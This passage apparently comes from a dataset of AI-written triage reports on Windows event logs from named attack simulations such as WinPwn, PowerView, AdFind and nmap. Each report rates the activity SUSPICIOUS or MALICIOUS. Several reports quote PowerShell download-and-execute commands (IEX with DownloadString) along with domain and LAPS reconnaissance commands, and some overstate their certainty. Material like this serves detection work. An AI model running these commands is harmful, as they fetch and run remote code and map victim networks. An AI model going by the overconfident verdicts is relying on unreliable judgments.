- **Repeated Use of System Utilities and PowerShell:** Frequent sequential execution of certain utilities might hint at automated scripts or automated reconnaissance potentially by malicious actors.
- **Recommendation:** Investigate the necessity and context surrounding the administrative privileges and usage of PowerShell commands. Check if `admin_test` activity matches expected usage patterns. Verify if these actions align with scheduled tasks or operational needs.

**Resolution:**
- **SUSPICIOUS**: The activities and logs indicate behaviors that are atypical for regular operations and warrant further investigation to rule out malicious activity, especially concerning privilege escalation and PowerShell usage."
WinPwn - MS17-10,"Based on the analysis of the provided Windows event logs from the system, there are several findings that point to potentially malicious activity. Here is a breakdown of the observations made across different logs:

### System Log Analysis:
1. **Time Change Events (EventID: 1 and 24)**:
   - There are a sequence of time change events where `svchost.exe` was involved in changing the system time. This could potentially be benign; however, unauthorized time manipulation can be indicative of an attempt to evade detection or to align with a specific timing for malicious tasks.

### Windows PowerShell Log Analysis:
1. **Suspicious PowerShell Activity (EventID: 600, 400, 403)**:
   - The logs show PowerShell invoking a download and execution of a script from a remote GitHub URL. This kind of behavior is a strong indicator of malicious activity, as it can be associated with downloading malware or running unauthorized scripts.
   - The script referenced from the URL and mention of `MS17-10`, which could be a reference to the EternalBlue (a well-known exploit), raises significant concerns about a potential exploit attempt.

### Security Log Analysis:
1. **Privileged Logons and Token Elevation (EventID: 4616, 4672)**:
   - The logs reveal logon events and privilege assignment with SeSecurityPrivilege, SeDebugPrivilege, among others, which are high-level privileges that could be used to perform unauthorized actions on the system.

### Application Log Analysis:
- No immediate indicators of concern are found; Windows Defender appears to be active.

### Sysmon Log Analysis:
1. **Process Creation (EventID: 1, 5)**:
   - Multiple processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and notably `powershell.exe` are seen executing. The creation of a PowerShell process with suspicious command line parameters further corroborates the PowerShell log findings.

2. **Unusual Process Activity**:
   - The execution of the `powershell.exe` with command-line arguments intended to download a script is consistent with techniques used in various cyber threats.

### Assessment and Conclusion:
Given the evidence of suspicious PowerShell activity attempting to download and execute a script from a remote location, association with an exploit (MS17-10), unauthorized time changes, and potential misuse of privileges, there is a strong indication of malicious activity occurring on the host.

### Resolution:
- **MALICIOUS**: The logs suggest that there is malicious activity on the monitored system. Immediate response and remediation should be conducted.

### Recommendations:
1. **Immediate Isolation**: Disconnect the affected system from the network to prevent further potential spread or damage.
2. **Detailed Forensic Analysis**: Perform a thorough forensic investigation to capture evidence, understand the extent of the compromise, and identify any backdoors or persistent threats.
3. **Remediation Steps**: Remove the malicious script and any associated malware. Verify system integrity and potentially reinstall the operating system if compromises are detected at a system level.
4. **Update and Patch Management**: Ensure all systems are up-to-date with the latest security patches to mitigate vulnerabilities like MS17-10.
5. **Monitor for Indicators of Compromise (IoCs)**: Ensure security tools are set to detect similar activities in the future."
Port Scan NMap for Windows,"Upon reviewing the provided event logs, several indicators of potentially suspicious activity were identified:

1. **PowerShell Execution**:
   - PowerShell is executed with the application `powershell.exe & {nmap 127.0.0.1}`. This command suggests the use of the `nmap` tool, which is a network scanner predominantly used for network discovery and security auditing. The presence of `nmap` in the PowerShell command line is unusual in a typical corporate environment unless explicitly used for legitimate network diagnostics or by an IT security professional.

2. **Cmd.exe Invocation**:
   - A command was executed via cmd.exe with the command line `""C:\\Windows\\system32\\cmd.exe"" /c ""nmap 2>nul""`. Similar to the PowerShell command, this indicates the use of `nmap`, which might be employed to perform network scanning operations.

3. **Installation of Software Components**:
   - Several processes like `vcredist_x86.exe` and `npcap-0.9982-oem.exe` were installed. `Npcap` is commonly used for packet capturing and might be deployed in environments utilizing network monitoring or analysis tools. However, unapproved installations of such components could pose a security threat as they can be leveraged for packet sniffing.

4. **Registry and CertUtil Usage**:
   - The event logs document the use of `certutil.exe` commands to add certificates to the trusted store, specifically `Insecure-SHA1.cer` and `Insecure-EV.cer`. Usage of `certutil` for certificate manipulation may indicate efforts to bypass security by installing untrusted or malicious certificates.
   - PowerShell logs also mention registry interactions, implying configurations or permissions may have been altered.

5. **Service Creation**:
   - Instances of service creations, specifically `Npcap Packet Driver (NPCAP)`, are logged. While not inherently malicious, unauthorized services can sometimes be indicative of persistence mechanisms.

### Threat Assessment and Further Actions

Based on the identified activities, there are certainly signs that could be classified as suspicious:

- **Network Scanning**: The execution of `nmap` through PowerShell and cmd, especially if unexpected or unauthorized, requires further analysis.
- **Service and Software Installations**: The installation of potentially unauthorized software like `npcap` and certificate activities using `certutil` needs verification.
- **Elevation of Privileges**: The privilege escalation (SeDebugPrivilege and SeLoadDriverPrivilege) events observed can be a precursor to potential compromise.

### Conclusion

The activities identified in the logs are sufficiently unusual and suspect, particularly due to the presence of network scanning via `nmap` and system modifications through registry and certificate stores. Hence, these events are categorized as **SUSPICIOUS**. 

#### Recommended Actions:
- **Immediate Review**: Conduct a thorough review of the system's user activity, especially focusing on admin or privileged accounts.
- **Security Programs**: Check for the legitimacy and necessity of installed services and applications (e.g., `Npcap` and `nmap`).
- **Network Monitoring**: Analyze network traffic to detect any unusual patterns or communications that might correspond with the scanners' activity.
- **User Verification**: Verify if the actions were performed by authorized personnel and within organizational protocols.
- **Malware Scanning**: Run a comprehensive malware scan to ensure no other instances of malicious software exist on the machine.

With these measures, further analysis will ascertain these events' nature and address potential risks or security breaches."
Get-DomainGPO to display group policy information via PowerView,"Upon analysis of the provided Windows event logs, here is a detailed assessment of the activities observed:

### Suspicious or Anomalous Behavior
- **PowerShell Activity**: A series of events indicate the execution of PowerShell scripts with suspicious command-line arguments. The command includes `powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('URL'); Get-DomainGPO`. This form of execution can be indicative of a PowerShell script used in malicious activity as it bypasses execution policy and obfuscates code.
- **Network-Related Script Execution**: The `IEX (New-Object Net.WebClient).DownloadString('URL')` pattern is used to download and execute code from a remote URL. This behavior is atypical and often associated with delivering a secondary payload or conducting reconnaissance activities within a network.
- **Running of Elevated Processes**: The Sysmon logs show processes such as `hostname.exe`, `whoami.exe`, and additional PowerShell instances running under an ""admin_test"" account with high integrity levels. Use of `whoami.exe` might be to check the current privileges, which could be a part of privilege escalation attempts.

### Indicators of Malicious Activity
- **PowerShell and Network Activity**: The repeated usage of the `IEX (New-Object Net.WebClient).DownloadString()` method from PowerShell is a significant malicious indicator. This method allows for the execution of potentially harmful remote scripts.
- **Execution of System Utilities**: Tools like `wevtutil.exe`, `conhost.exe`, and oversight processes executed under administrative accounts might suggest an attempt to cover tracks or further manipulate the system.
- **EDR Alert Correlation**: The logs corroborate an EDR alert, indicating that the triggered behavior aligns with potentially harmful activity recognized by pre-existing security measures.

### Recommendations and Resolution
1. **Immediate Incident Response**: Initiate responsive actions such as isolating the affected host to prevent potential lateral movement across the network. Consider engaging your incident response team for a deeper forensic analysis.
2. **Threat Intelligence and Containment**: Use the identified malicious PowerShell command and URL patterns for threat intelligence gathering and feed these into network security appliances to block future attempts.
3. **Remediate and Harden**: Patch any vulnerabilities, ensure PowerShell logging is fully enabled, and restrict execution policies and remote script execution capabilities via Group Policy.
4. **User Education and Monitoring**: Educate users on security best practices, focusing on phishing awareness as the initial vector and enhance monitoring to detect similar anomalies in future.

**Final Resolution: MALICIOUS** - The activities documented in the logs point to 100% malicious actions, particularly due to unauthorized PowerShell usage to execute remote scripts, valid URL downloads, and attempts to act with elevated privileges. Immediate remediation and investigation are strongly advised."
Detect Virtualization Environment via WMI Manufacturer-Model Listing (Windows),"Based on the provided logs, here is a detailed analysis and assessment:

### Security Logs:
- **EventID 4616** shows a change in system time initiated by the `svchost.exe` process as `LOCAL SERVICE`. This activity might suggest potential time-tampering, but without additional context on system operations or intention, this alone may not be explicitly malicious. 

### PowerShell Logs:
- The PowerShell logs include a script that checks for virtualization (VMware, VirtualBox). This script appears to be a generic way to detect virtualized environments. Such scripts could be used legitimately by IT for system checks or deployment environments, but they can also be used by malware to detect virtual environments used for analysis. However, the script and usage as seen here do not contain immediately obvious threats such as downloading or executing malicious payloads.

### Application Logs:
- The `Microsoft-Windows-Security-SPP` (Software Protection Service) log entries appear routine, with no indication of issues or compromise.
- The `edgeupdate` service's log simply shows a service stop, which is benign unless further unauthorized stops or starts were unexpected or repeated.

### System Logs:
- Kernel-General and Time-Service events reflect normal time synchronization and changes. This coincides with security log time adjustment entries but lacks additional suspicious indicators.

### Sysmon Logs:
- Multiple executions of `wevtutil.exe` are captured, interleaved with `conhost.exe`, under the user `admin_test`. `wevtutil.exe` usage could indicate event log manipulation, which might be of concern if unauthorized.
- `powershell.exe` execution aligns with PowerShell logs. The logged PowerShell command ups the suspicion slightly due to the virtualization detection focus, though by itself remains non-malicious.
- `whoami.exe`, `conhost.exe`, and `HOSTNAME.EXE` executions are typical for system or administrative checks, not inherently indicative of threats.
- `MicrosoftEdgeUpdate.exe` and related activities pertain to regular updates, showing system processes managed by `SYSTEM`.

### Assessment and Resolution:
- **Suspicious Activity Noted**: The time change logged, execution pattern of `wevtutil.exe`, and the PowerShell script checking for virtual environments could be potentially suspicious if poorly contextualized or coupled with further unauthorized access or changes.
- **Recommendation**: Investigate the rationale behind the `wevtutil.exe` usage. Confirm if the PowerShell command was expected and part of administrative tasks. Review access logs or alerts that precipitated this investigation for any correlation with unauthorized access, especially involving the `admin_test` account.

### Resolution:
Given the current evidence, the situation is marked as **SUSPICIOUS**. Further investigation is warranted to clear up uncertainties around certain activities, particularly with event logs manipulation and PowerShell usage in detecting virtual environments."
Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd,"### Detailed Analysis of the Logs:

#### **Security Logs:**
- **EventID 4616:** Two events related to ""Microsoft-Windows-Security-Auditing"" indicate a time change with the process ""C:\Windows\System32\svchost.exe"". Typically, time changes are not inherently malicious, as they may be part of system updates or configurations. However, unexpected changes, especially by critical processes like `svchost.exe`, should be scrutinized if they occur frequently or unexpectedly.

#### **PowerShell Logs:**
- **EventID 600**: Series of PowerShell events indicate a script execution leveraging the `AdFind.exe` tool, which was invoked from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\AdFind.exe`. This is concerning as `AdFind.exe` is often used for querying Active Directory data, and its use in a PowerShell script executed from a temporary directory potentially indicates a red team exercise or malicious activity, particularly if `AdFind.exe` is not part of standard operations or deployment.

#### **System Logs:**
- **EventID 35** from ""Microsoft-Windows-Time-Service"" indicates a legitimate time sync operation. This does not appear suspicious on its own unless frequent adjustments are present.

#### **Sysmon Logs:**
- **EventID 1 and 5**: Various instances of processes like `whoami.exe`, `powershell.exe`, `wevtutil.exe`, `conhost.exe` being executed. Of particular interest is the execution of `whoami.exe`, `powershell.exe` with what appears to be abnormal command-line activities, considering their relation to the `AdFind` tool.
- Observations for `powershell.exe` show actions similar to a reconnaissance activity using PowerShell, indicated by execution from a suspicious path, raising suspicion about the intent.

#### **Application Logs:**
- **EventID 16384**: A regular operation by ""Microsoft-Windows-Security-SPP"" related to the Software Protection Platform. This seems benign.

### Indicators of Suspicious or Malicious Activity:
1. **Use of AdFind.exe:** This happens via PowerShell and executed from a temporary folder. This execution context, combined with PowerShell's flexibility in scripting, often correlates with indicators observed in red team pentests or real attacks.
2. **PowerShell Execution Context:** Leveraging temporary file directories is not a standard practice and should be questioned, especially when coupled with network discovery tools like `AdFind.exe`.
3. **Pattern of Sysmon Logs:** Numerous entries executing contextually unnecessary commands (`whoami`, `powershell`, etc.) in a possibly authorized user context (`admin_test`).

### Assessment:
- The logs consistently show patterns where tools often used in malicious contexts are executed under potentially dubious circumstances (e.g., from a temporary directory and accompanied by extensive PowerShell usage).
- The use of `AdFind.exe` indicates reconnaissance activities which are standard in targeted attacks aimed at gathering Active Directory information.
  
### Recommendations:
1. **Further Investigation:** 
   - Determine whether the use of `AdFind.exe` is sanctioned and by whom.
   - Review the paths and scripts for unauthorized modifications.
   - Check if the user `admin_test` was compromised or if this is known behavioral activity.

2. **Immediate Actions:**
   - If confirmed unauthorized, consider isolating the host to investigate for a breach.
   - Implement detailed logging of PowerShell activity for oversight.
   - Review administrative privileges and accounts listing such as `admin_test` for potential compromise.

### Resolution:
- **SUSPICIOUS**: Due to the irregular PowerShell execution involving `AdFind.exe`, originating from a non-standard path and unexpected time changes, the logs suggest activities inconsistent with typical administrative operations, needing further investigation."
View available share drives,"### Windows Event Log Analysis:

Based on the log entries provided for analysis, I have assessed the data to identify any indicators of malicious activity or anomalies that warrant further investigation.

#### Observations:
1. **Time Synchronization Events** (`Event ID: 4616` in the Security log and `Event ID: 1, 24` in the System log):
   - Time changes on the system are logged. These changes are minor and seem to involve regular synchronization activities with `time.windows.com`.
   - The process responsible (`svchost.exe`) is a legitimate Windows service handler and appears with expected credentials (`NT AUTHORITY`).

2. **Windows Update and Defender Activity**:
   - There are several logs related to Windows Updates and Microsoft Defender, with activity like `Security Intelligence Update` being logged.
   - Processes involved (`wuauclt.exe`, `MpCmdRun.exe`) are standard for updates and antivirus product operation.

3. **Edge Update**:
   - Logs show the execution of multiple processes related to Edge updates, such as `MicrosoftEdgeUpdate.exe` and its setup variants. The execution paths and arguments, such as `/svc`, `/regsvc`, and `/ping`, are consistent with normal update operations.

4. **Wevtutil and Conhost Processes**:
   - The execution of `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\\admin_test` occurs multiple times within Sysmon logs.
   - `wevtutil.exe` is a tool for retrieving and managing event logs, and `conhost.exe` is associated with the console window. However, there is no clear indication of why `wevtutil.exe` might be used repeatedly, which might be worth noting.

5. **Command Line Execution via PowerShell**:
   - There is evidence of command execution, specifically the command `cmd.exe /c net share`, which is used to display or configure shared resources. While this command isn't inherently malicious, its presence, especially coming from an administrative account, may warrant further investigation to verify legitimacy.

6. **Process Execution Anomalies**:
   - Multiple legitimate system processes were executed with `High` integrity levels, which is typical for administrative commands in a Windows environment. However, these should match expected patterns of administrative tasks.

#### Assessment:
- **BENIGN Activities**: The synchronization of time, Defender updates, and Edge updates seem to be regular Windows maintenance activities.
- **SUSPICIOUS Activities**: The use of `wevtutil.exe` and `cmd.exe /c net share` initiated from an administrator account (`admin_test`) might suggest exploration activity, possibly legitimate or unauthorized access to system logs and network shares.

#### Guidance and Resolution:
Given the analysis of the current logs and associated activities, the situation doesn't present clear evidence of compromise but does contain activities (the use of `wevtutil.exe` and `cmd.exe`) that do not explicitly confirm a benign or authorized nature without context.

- **Resolution**: **SUSPICIOUS**
  - **Action Recommended**: Conduct further investigation into the context and necessity of `wevtutil.exe` and `cmd.exe` executions, particularly focusing on user intent and if these match documented administrative actions.
  - **Monitoring**: Increase monitoring on the `admin_test` account to ensure all actions align with expected administrative behavior and check for any additional accesses or modifications to event logs or network shares."
Enumerate Remote Hosts with Netscan,"Upon analyzing the provided Windows event logs, several key observations are as follows:

1. **Security Log Entries (EventID 5379 and 4624/4672)**:
   - Event ID 5379 indicates failed attempts to read credential information associated with a Microsoft Account and Windows Live token. The repeated failure (ReturnCode 3221226021) could suggest an issue with credential retrieval rather than a definite sign of compromise. However, the consistent failure to access credentials is worth noting.
   - Event ID 4624 indicates a successful logon event for the SYSTEM account, which generally aligns with normal operations on a Windows system.
   - Event ID 4672 signifies that high-level privileges are being granted to the SYSTEM account, including privileges such as SeDebugPrivilege and others, which are typical for SYSTEM-level processes.

2. **Sysmon Logs and Process Executions**:
   - The execution of PowerShell (EventID 1 and 5) with command lines suggesting the use of networking tools like `netscan.exe` might be part of legitimate administrative tasks. However, the execution paths and the use of `/hide` and `/auto` flags could also be indicative of obfuscation or unauthorized scanning activity.
   - Multiple instances of known Windows processes like `wevtutil.exe`, `conhost.exe`, and `wevtutil.exe` are observed. These executions, especially when associated with the `admin_test` user, could align with benign administrative activities; however, they warrant further investigation if not utilized in normal operations.
   - Updates and installations of Microsoft Edge and Windows Defender definitions are noted (with processes such as `wuauclt.exe` and `AM_Delta.exe`). These are consistent with normal system update behavior.

3. **Windows PowerShell Logs**:
   - Logs indicate that PowerShell sessions were initiated with possible administrative intentions (such as invoking external scripts or applications with elevated privileges). This aligns with identified Sysmon events.

4. **Application Log**:
   - A straightforward entry confirming that Windows Defender is active, showing SECURITY_PRODUCT_STATE_ON which implies that the system's antivirus is active.

**Assessment**:
Based on the analysis:
- The environment shows a mix of standard operational behavior (such as occasional Edge updates and Windows Defender activities) and ambiguous activity (like the hidden execution of `netscan.exe` and repeated credential access attempts).
- The observed use of PowerShell to execute potentially hidden network scans could be suspicious, especially if performed outside regular administrative tasks or if the context of such execution is not documented or is unexpected.

**Resolution**: 
- **SUSPICIOUS**: The presence of hidden or automated execution of network scanning tools and the consistent failure to retrieve certain credentials warrant a closer look. While there are legitimate elements, these suggest the possible need for further investigation to confirm whether these activities are authorized or benign.

**Guidance**: 
1. **Verify**: Confirm the legitimacy of the network scanning tasks and understand if they are part of regular administrative or scheduled tasks.
2. **Review User Activity**: Analyze logs associated with the `admin_test` user account to confirm any unauthorized changes or unusual behavior.
3. **Monitor**: Continue monitoring for similar activities or unexpected process executions, especially those like `PowerShell` and network utilities.
4. **Check Updates**: Ensure Edge and Windows Defender updates are consistent with expected updates and their origin is verified."
Peripheral Device Discovery via fsutil,"Upon analyzing the provided event logs from the CEO's machine, I have identified various patterns and behaviors that warrant closer attention. Below is a detailed analysis of the log entries:

### Observations:

1. **Time Synchronization**:
   - Multiple entries across the logs indicate time changes, which is generally a routine system operation. These include updates from the Microsoft-Windows-Time-Service and kernel events showing time change. There are no indications that these changes were illicitly performed or part of a malicious activity.

2. **Microsoft Edge Update Activities**:
   - Several Sysmon logs show Microsoft Edge Update operations and related processes, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, executed under the NT AUTHORITY\SYSTEM user. This execution context is typical for system-level updates and is run in high integrity, suggesting legitimate update actions. However, there are multiple Edge Update processes executing within a short timespan, and they have various command-line arguments, which can be indicative of a legitimate update process.

3. **Use of Command-Line Utilities**:
   - System utilities such as `hostname.exe`, `whoami.exe`, `cmd.exe` (with command `fsutil fsinfo drives`), and others were executed. Although these utilities are legitimate, excessive or unexpected use can sometimes be associated with reconnaissance activities. However, the utilities executed here seem to tie back to the system update activities.

4. **Presence of System Services**:
   - Various services including `svchost.exe` were active, and there were legitimate service operations such as `sppsvc.exe` related to the Software Protection Platform. No anomalies were observed here linked to malicious endeavors.

5. **Kernel and System Level Logs**:
   - The kernel logs and security auditing (event ID 4616) related to time change consistently appear to be linked with routine updates and system time synchronization efforts.

### Assessment:

Upon reviewing the logs, I did not find 100% conclusive evidence of malicious activity or security compromise. The logs mainly indicate a system state consistent with updates, particularly around Microsoft Edge, and typical system maintenance activities like time synchronization. The high frequency of update-related logs might initially seem suspicious, but given the context of system-wide updates (e.g., Edge), it appears coherent.

### Resolution:

- **SUSPICIOUS**: While no explicitly malicious activity has been identified, the volume and timing of Microsoft Edge updates and associated activities do raise some suspicion. Further investigation might be necessary to ensure that these activities are not leveraged under false pretenses (e.g., via a compromised update service). I recommend network traffic analysis during these events and verification of update behavior against known good baselines.

### Recommended Actions:

1. **Network Traffic Review**: Examine network traffic outgoing from the CEO's machine during the update period to verify communication with legitimate servers.
2. **Validation of Updates**: Confirm that the updates correspond to genuine Microsoft Edge updates by checking file signatures and update schedules.
3. **Monitor Future Activities**: Continue to monitor the machine for any unusual patterns or deviations in process creation, network connections, or additional Edge behavior in subsequent days."
Enumerate all accounts via PowerShell (Domain),"Upon analyzing the provided logs, the following observations and analysis were made concerning potential suspicious activities:

### Observations:

1. **Execution of System Utility Tools**:
    - Several instances of `wevtutil.exe` and `conhost.exe` are executed by the user `SERVER002\\admin_test`.
    - `wevtutil.exe` is a legitimate Windows command-line utility used to query and manage event logs, while `conhost.exe` is commonly associated with console processes. Multiple rapid executions of these processes could be indicative of event log enumeration (likely performed in rapid succession).

2. **PowerShell Activity**:
    - `powershell.exe` was executed with the following command-line: `""\""powershell.exe\"" & {net user /domain, get-localgroupmember -group Users, get-aduser -filter *}""`. 
    - This activity indicates the enumeration of users within the domain and potentially retrieving group members and Active Directory users, which could be reconnaissance activities.

3. **Additional Network and System Commands**:
    - The commands `net.exe` and `net1.exe` were executed with parameters related to domain user enumeration. This supports further evidence of recon activities.

4. **Processes Executed with High Integrity Levels**:
    - The Sysmon logs show processes like `whoami.exe`, `hostname.exe`, and `powershell.exe` being executed with high integrity levels. These processes are part of normal administration tasks, but their frequent execution, especially in conjunction with the other enumerations, increases suspicion.

5. **Security Log Entries**:
    - Event ID 4799 indicates an enumeration of user groups, executed through PowerShell. This aligns with the observed PowerShell command.

### Assessment:

- **Possible Indicators of Malicious Reconnaissance Activity**:
  - The rapid execution of utilities like `wevtutil.exe`, frequent PowerShell commands with a focus on user enumeration, and the network command execution are collectively symptomatic of reconnaissance, potentially indicative of lateral movement preparation.
  - The involvement of the user `SERVER002\\admin_test`, executing commands that could enumerate user and group information, is suspicious, particularly if this account typically does not perform such operations.

### Risk and Threats:

- Given the combination of tools used, the nature of the PowerShell command, and the context provided (an EDR alert on the CEO machine), there is a high likelihood that these activities were conducted by a threat actor performing reconnaissance for malicious purposes.

### Recommendation and Resolution:

- **Resolution: SUSPICIOUS**
  - The activity is classified as suspicious because while it aligns with potential threat reconnaissance, it does not show definitive malicious exploits or compromise. Further investigation is required to ascertain whether these activities align with legitimate administrative tasks or if they indicate initial stages of a broader attack.
  
- **Guidance**:
  - Investigate the context and use of `SERVER002\\admin_test`, verifying if this account should be executing such commands.
  - Review related security logs for any additional unauthorized access or command execution patterns.
  - Monitor for any subsequent suspicious activities and consider isolating the affected systems if necessary.
  - Check for any unforeseen changes, especially related to policy or configuration that could grant unauthorized accesses. 

These actions should be taken promptly to confirm the intent of these actions and mitigate potential risks."
System Information Discovery with WMIC,"### Analysis of Windows Event Logs:

Upon examining the logs provided, several key observations are made:

#### 1. **MicrosoftEdgeUpdate.exe Execution:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` are observed, with different command-line arguments such as `/ping`, `/update`, `/regsvc`, `/ua /installsource core`. These command-line usages seem to be legitimate operations for updating or checking the status of the Microsoft Edge browser.

#### 2. **Process Creation Related to Whoami and CMD:**
   - Processes like `whoami.exe`, `cmd.exe`, and numerous `wmic.exe` invocations are observed. The use of `whoami.exe` to list user information is not inherently suspicious unless it is part of other malicious behavior.
   - The `cmd.exe` invocation with several WMIC commands is notable, as it gathers detailed system information (CPU, memory, video controller, OS details, disk information, etc.). This behavior could align with benign inventory or system diagnostics but could also be indicative of reconnaissance by a threat actor.

#### 3. **Wevtutil Usage:**
   - Frequent launching of `wevtutil.exe` by the `admin_test` user is detected. Wevtutil is used to manage Windows event logs. While not malicious itself, excessive or unauthorized usage could imply log tampering attempts.

#### 4. **Other Processes:**
   - Processes such as `conhost.exe`, `hostname.exe`, and `sppsvc.exe` (Software Protection Platform Service) frequently appear; these seem standard with no immediate indication of malicious behavior when used normally.

#### 5. **Privileged Operations and System Integrity:**
   - All operations occur under the `NT AUTHORITY\SYSTEM` or high integrity context, which is expected for legitimate system or update operations but could also facilitate certain types of attacks if control is compromised.
   - There's no direct evidence of privilege escalation attempts, but close monitoring is warranted given the elevated privileges in use.

### Threat/Risks Assessment:

- The logs mostly depict routine system updates, particularly related to Microsoft Edge. The behavior itself does not indicate a direct compromise but reflects a pattern that requires verification under specific security controls (such as confirming update legitimacy and ensuring user action aligns with system policy).
  
- `wevtutil.exe` could pose a potential risk if found to be used to erase logs or make unauthorized changes. Confirmation should be sought if this was executed purposefully or as part of automated or scheduled tasks (scheduled tasks might include diagnostics or updates).

- The pervasive usage of WMIC commands in one session is suspicious and correlates with reconnaissance or details gathering, which could suggest preparatory steps if done by unauthorized users.

### Guidance on Proceeding:

- Verify with IT/Infosec if the executions (specifically `whoami.exe`, `wevtutil.exe`, and WMIC commands) were part of routine administrative tasks.
- Audit user permissions and the context under which the commands like `wevtutil.exe` operate, ensuring it aligns with the organization's policy and does not have undesired access or usage.
- Consider implementing enhanced auditing and alerts for:
  - Excessive or unexpected `wmic.exe` command usage.
  - Use of administrative tools like `wevtutil.exe`.
- Review scheduled tasks or automation scripts that might match this activity and ensure they are securely configured.

### Conclusion:

The logs exhibit **SUSPICIOUS** activity — predominantly due to the potential misuse of `wevtutil.exe` and network diagnostic commands via WMIC that may warrant further investigation to rule out stealthy reconnaissance or data gathering by unauthorized entities."
PowerView ShareFinder,"After analyzing the provided logs, here are the key observations:

### Suspicious Activity in PowerShell Logs:
1. **PowerShell Execution**: 
   - The command suggests an import operation of a script located in a temporary directory, `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\script.ps1`, seemingly followed by the execution of `Invoke-ShareFinder -CheckShareAccess`.
   - The use of temporary paths and relative directory traversal (`..`) can often indicate attempts to obfuscate the true origin or purpose of the command, which raises concerns about its intent and origin.

### Sysmon Logs Analysis:
1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by `admin_test` could potentially indicate log manipulation or enumeration attempts, especially when rapidly executed in sequence.
   - Processes like `HOSTNAME.EXE`, `whoami.exe`, and `PowerShell.exe` were run under the `admin_test` account, potentially indicating system enumeration or reconnaissance activities.

### Security Logs: 
1. **Time Change Events**:
   - Several logs indicate time changes on the system. While this can occur legitimately due to time synchronization with a time source, it can also point to attempts to modify timestamps to conceal activities.

2. **Privilege Escalation**:
   - Event ID 4672 indicates the assignment of special privileges to the SYSTEM account. While this can be a legitimate event, in the context of other suspicious activities, it warrants further scrutiny.

### Application and System Logs:
- The logs featured numerous service-related activities, such as the Edge Update and other Microsoft processes typical for routine updates. However, no direct anomalies were detected specifically in these logs.

### Final Assessment and Resolution:
Given the context of observed activities, especially the suspicious PowerShell execution and potential log tampering, the behavior appears unusual and deviation from typical patterns. Although there is no direct evidence confirming malicious intent, the combination of these activities necessitates further investigation, especially focusing on:
- The origin and purpose of the PowerShell script.
- Verification of the legitimacy of user activity involving `wevtutil.exe` and associated log manipulations.

**Resolution: SUSPICIOUS**
- Further detailed analysis and investigation are recommended, including reviewing the contents of the involved script, the nature of the user activities, and any potential external connections or data exfiltration attempts.
- Validate through threat intelligence sources if `Invoke-ShareFinder` and related modules are part of known malicious activities."
WinPwn - Morerecon,"### Analysis:

1. **PowerShell Logs:**
   - **Command Execution**: The logs show a PowerShell process executing a script from a remote GitHub repository. The command `powershell.exe & {$script_repo='https://raw.githubusercontent.com/script'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1'); Morerecon -noninteractive -consoleoutput}` is executed. This behavior is highly suspicious as it involves downloading and executing code from an external source, a common tactic used by attackers for initial access or payload delivery.
  
2. **Security Logs:**
   - **Logon Events**: There are logon events (Event ID 4624) and special privilege assignment events (Event ID 4672) for the user ""admin_test."" The privileges include sensitive rights such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These could indicate an elevated level of access that might have been misused.
   
3. **Sysmon Logs:**
   - **Process Creation**: The creation of PowerShell with the command line involving remote script execution is captured here as well, reinforcing the suspicious activity noted in PowerShell logs.
   - **No Indicative Tampering on Legitimate Processes**: The logs show execution of legitimate processes relating to Microsoft Edge updates, which seems routine and not directly suspicious.
   
4. **Application Logs:**
   - **Windows Defender Status**: Windows Defender was reported as ON, suggesting that it did not detect the PowerShell activity as malicious, which might indicate evasion techniques used by the suspicious process.

### Assessment:
- The PowerShell activity is a significant indicator of potentially malicious behavior. The fact that a script is being downloaded and executed directly from a unverified GitHub repository is highly risky and can lead to system compromise. 
- The elevated privileges associated with the user ""admin_test"" could provide ample opportunity for actions that could be used for persistence or further exploitation if misused.

### Resolution: **MALICIOUS**

The execution of PowerShell scripts from an external source, especially those not directly controlled by the organization, is a strong indicator of malicious activity aimed at potentially compromising the system. Immediate response actions should be initiated to contain and analyze the affected host.

### Recommendations:
1. **Containment**: Isolate the system from the network to prevent potential lateral movement.
2. **Investigation**: Examine the script from the GitHub link offline in a controlled environment to identify its functionality.
3. **User Account Review**: Investigate the usage and necessity of the elevated privileges for the ""admin_test"" account.
4. **Forensics**: Conduct a full forensic analysis of the host to identify any other potential malicious activities or artifacts.
5. **Remediation**: Remove any malicious scripts or unwanted software installed due to this activity.
6. **Monitoring**: Enhance monitoring on similar PowerShell activities and command executions across other systems.
7. **Awareness**: Increase user awareness regarding the risks associated with executing scripts from unknown sources."
System Network Connections Discovery with PowerShell,"### Analysis of Logs:

Upon investigation of the provided Windows event logs, several points of interest and potential concern have been identified:

1. **PowerShell Activity**:
    - Multiple PowerShell events recorded indicate that `powershell.exe` was started with the command `{Get-NetTCPConnection}`. This command is typically used to list active TCP connections. While PowerShell is a legitimate tool, its usage can be leveraged for malicious purposes, such as network reconnaissance. However, without more context, such use could also be part of legitimate administrative tasks.

2. **Sysmon Events**:
    - A series of events detail the execution of processes such as `svchost.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, and notably `whoami.exe`. The use of `whoami.exe` indicates an action to verify the current user's identity, typically done during the reconnaissance or privilege escalation phase in attacks.
    - The frequent execution of `wevtutil.exe`, particularly by an `admin_test` user, requires further scrutiny. `wevtutil.exe` is a tool used to work with event logs, which can be benign but might also suggest attempts to gather information or clear tracks.

3. **System-Level Time Change**:
    - There is a notable time change event in the system logs, with the time being set backward. Modifying system time can be employed by attackers to hide activities or manipulate log timestamps, which is suspicious.

4. **General Observations**:
    - There are multiple instances where common Windows utilities were executed in succession. This pattern could align with a legitimate script for system checks. However, combined with the time manipulation and other admin-level actions, this could also align with steps taken during unauthorized access or data gathering by an attacker.

### Assessment:

The investigation reveals signs of potentially suspicious activity:

- The command executed via PowerShell for network connections, frequent utility executions, and administrative path check (`whoami.exe`) collectively hint at reconnaissance activities.
- Time alterations might be indicative of attempts to obfuscate actions.

These activities do not conclusively demonstrate malicious behavior but present a suspicious pattern that could either align with benign administrative tasks or initial stages of compromise.

